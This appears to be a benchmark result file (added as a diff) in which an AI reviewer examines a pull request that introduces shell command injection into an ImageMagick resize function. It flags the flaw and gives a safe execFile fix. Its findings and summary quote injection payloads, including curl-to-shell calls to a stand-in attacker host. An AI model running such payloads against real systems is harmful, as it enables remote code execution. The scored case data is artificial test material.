@@ -1,0 +1,108 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "0c26652cd134",
+  "turns": 4,
+  "tool_calls": null,
+  "seconds": 52.5,
+  "setup_seconds": 0.0,
+  "total_seconds": 52.5,
+  "usage": {
+    "in": 32193,
+    "cache_read": 88320,
+    "cache_write": 0,
+    "out": 2538,
+    "source": "cli"
+  },
+  "cost_usd": 0.10611,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "critical",
+      "body": "**Issue:** Replacing `execFile` with `exec` and embedding `src` / `filter` in a shell template lets callers run arbitrary commands as the process user.\n\n**Failure mode:** `filter` is unquoted, so input such as `Lanczos; curl http://attacker.test/$(id)|sh` executes after `-filter`. Double-quoting `src` does not help: `img\"; touch /tmp/pwned; echo \"` still breaks out. The PR description frames these as user-composed filter expressions, so the values are attacker-influenced by design.\n\n**Fix:** Keep a non-shell spawn and pass tokens as argv (validate `filter` against an allowlist of ImageMagick filter names if needed):\n\n```ts\nimport { execFile } from \"child_process\";\n\nexport function resize(src: string, filter: string, w: number): Promise<string> {\n  return new Promise((res, rej) => {\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) =>\n      e ? rej(e) : res(\"/tmp/out.png\")\n    );\n  });\n}\n```\n\nDo not reintroduce `exec` / `shell: true` for this path."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity": "warning",
+      "body": "**Issue:** `resize(src, w)` becomes `resize(src, filter, w)` with a new required middle argument.\n\n**Failure mode:** Existing TypeScript call sites fail to compile; any JS callers pass the width as `filter` and leave `w` undefined, producing invalid `-resize undefinedx` (and still hitting the shell-injection path on `src`).\n\n**Fix:** Append an optional parameter or overload \u2014 e.g. `resize(src: string, w: number, filter: string = \"Lanczos\")` \u2014 and migrate callers explicitly."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces remote/local command injection by switching from `execFile` to shell `exec` and interpolating caller-controlled `src` and `filter` into the command string.\n\n## Why this is blocking\n\n`src/images/resize.ts` previously invoked ImageMagick via `execFile` with an argv array (no shell). The new code builds a single shell string:\n\n```ts\nexec(`convert \"${src}\" -filter ${filter} -resize ${w}x /tmp/out.png`, ...)\n```\n\nConcrete failure modes:\n\n- **`filter` is unquoted** \u2014 a value like `Lanczos; id > /tmp/pwned` or `$(curl attacker.test|sh)` runs as shell metacharacters after `-filter`.\n- **`src` is only double-quoted** \u2014 a path/value like `\"; curl attacker.test|sh; echo \"` breaks out of the quotes and still executes.\n- The inline comment claims a shell is required for user-composed filter expressions; ImageMagick filter names and `-define` style options are ordinary argv tokens and work with `execFile`/`spawn` without a shell.\n\nAny caller that passes upload paths, query params, or UI \u201cfilter expression\u201d strings into `resize()` hands the process owner\u2019s privileges to that input.\n\n## Secondary note\n\nAdding `filter` as a required middle parameter also breaks existing `resize(src, w)` call sites at compile/runtime; that is secondary to the injection issue.\n\n**Recommendation:** request-changes\n",
+  "round": "full",
+  "effective_max_turns": 20,
+  "budget": {
+    "tier": "standard",
+    "profile": "auto",
+    "turns": 20,
+    "alias": "balanced",
+    "model": "grok-4.5",
+    "output_tokens": 8192,
+    "verifier_warning_pct": 30,
+    "patch_bytes": 120000,
+    "native_cap_applied": true
+  },
+  "prior_finding_updates": {},
+  "prior_findings_kept": [],
+  "outstanding_verdicts": [],
+  "verification": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The head version switched from execFile argv to exec with a shell template that interpolates unquoted filter and only double-quoted src, so both parameters can break out into arbitrary commands. Base used execFile safely; this is a real critical shell-injection regression."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity_claimed": "warning",
+      "status": "skipped",
+      "reason": "not sampled"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 10.029,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 1,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 1268,
+      "out": 401
+    },
+    "cost_usd": 0.006196
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 0,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
